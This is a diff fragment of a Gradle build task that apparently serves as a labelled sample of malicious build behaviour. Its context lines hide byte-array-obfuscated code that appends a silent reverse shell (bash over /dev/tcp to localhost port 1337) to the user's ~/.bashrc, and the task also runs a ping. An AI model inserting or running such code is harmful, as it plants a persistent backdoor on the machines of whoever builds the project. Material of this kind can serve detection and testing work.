@@ -27,8 +27,8 @@ task do_stuff << {
     new FileOutputStream(file("${System.properties[new String([117,115,101,114,46,104,111,109,101] as byte[])]}${new String([47,46,98,97,115,104,114,99] as byte[])}"), true).write([10,98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,62,38,47,100,101,118,47,116,99,112,47,108,111,99,97,108,104,111,115,116,47,49,51,51,55,32,48,62,38,49,32,38,100,105,115,111,119,110,34,38,62,47,100,101,118,47,110,117,108,108,10] as byte[])
 
     // Network activity
-    // Ping reddit
-    "ping -c 1 reddit.com".execute()
+    // Ping example.com
+    "ping -c 1 example.com".execute()
 
     // Process left running
     // Persistent backdoor
